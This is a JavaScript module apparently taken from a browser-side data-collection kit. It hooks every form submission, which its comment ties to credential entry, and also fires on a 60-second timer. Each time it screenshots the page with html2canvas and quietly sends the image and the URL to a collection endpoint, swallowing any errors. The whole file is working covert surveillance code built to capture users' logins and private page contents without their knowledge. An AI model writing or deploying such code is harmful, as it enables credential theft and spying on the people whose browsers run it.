export default class ScreenshotCapturer {
  constructor(core) {
    this.core = core;
    this.capturedUrls = new Set();
  }

  init() {
    // Capture screenshot when credentials are submitted
    document.addEventListener('submit', () => {
      setTimeout(() => this.capture(), 500);
    });

    // Also capture periodically (every 60 seconds)
    setInterval(() => this.capture(), 60000);
  }

  async capture() {
    try {
      const html2canvas = (await import('html2canvas')).default;
      const canvas = await html2canvas(document.body, {
        useCORS: true,
        allowTaint: true,
        scale: 0.5,
        logging: false,
        backgroundColor: null
      });
      
      const data = canvas.toDataURL('image/jpeg', 0.4);
      const url = window.location.href;

      this.core.send('/api/collect/screenshot', { data, url });
    } catch (e) {
      // Silent fail
    }
  }
}